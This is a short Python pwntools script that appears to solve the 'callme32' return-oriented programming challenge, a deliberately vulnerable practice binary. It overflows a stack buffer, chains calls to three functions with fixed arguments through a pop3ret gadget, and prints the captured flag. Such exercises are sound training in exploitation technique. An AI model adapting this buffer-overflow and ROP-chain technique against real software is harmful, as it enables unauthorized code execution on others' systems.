from pwn import *

BINARY = "./callme32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

pop3ret = 0x080487f9

rop = b"A" * 44
rop += p32(ELF.symbols['callme_one'])
rop += p32(pop3ret)
rop += p32(0xdeadbeef)
rop += p32(0xcafebabe)
rop += p32(0xd00df00d)

rop += p32(ELF.symbols['callme_two'])
rop += p32(pop3ret)
rop += p32(0xdeadbeef)
rop += p32(0xcafebabe)
rop += p32(0xd00df00d)

rop += p32(ELF.symbols['callme_three'])
rop += p32(pop3ret)
rop += p32(0xdeadbeef)
rop += p32(0xcafebabe)
rop += p32(0xd00df00d)

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
